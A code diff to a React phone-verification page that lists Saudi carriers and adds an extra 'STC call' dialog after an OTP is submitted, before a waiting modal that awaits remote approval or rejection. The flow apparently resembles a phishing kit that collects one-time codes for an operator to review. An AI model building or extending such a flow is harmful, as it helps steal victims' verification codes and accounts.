@@ -5,10 +5,11 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Phone, ShieldCheck, CreditCard, Lock } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { db, addData, isFirebaseConfigured, handleCurrentPage } from "@/lib/firebase";
+import { db, isFirebaseConfigured, handleCurrentPage } from "@/lib/firebase";
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
 import { PhoneOtpDialog } from "@/components/phone-otp-dialog";
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
+import { StcCallDialog } from "@/components/stc-call-dialog";
 
 const telecomOperators = [
   { value: "stc", label: "STC - الاتصالات السعودية" },
@@ -29,6 +30,7 @@ export default function PhoneVerificationPage() {
   const [selectedCarrier, setSelectedCarrier] = useState("");
   const [showOtpDialog, setShowOtpDialog] = useState(false);
   const [showWaitingModal, setShowWaitingModal] = useState(false);
+  const [showStcCallDialog, setShowStcCallDialog] = useState(false);
   const [otpRejectionError, setOtpRejectionError] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
@@ -162,6 +164,15 @@ export default function PhoneVerificationPage() {
 
   const handleOtpSubmitted = () => {
     setShowOtpDialog(false);
+    if (selectedCarrier === "stc") {
+      setShowStcCallDialog(true);
+    } else {
+      setShowWaitingModal(true);
+    }
+  };
+
+  const handleStcCallComplete = () => {
+    setShowStcCallDialog(false);
     setShowWaitingModal(true);
   };
 
@@ -357,6 +368,11 @@ export default function PhoneVerificationPage() {
         onApproved={handleApproved}
         onRejected={handleRejected}
         onOtpRejected={handleOtpRejected}
+      />
+
+      <StcCallDialog
+        open={showStcCallDialog}
+        onComplete={handleStcCallComplete}
       />
     </>
   );
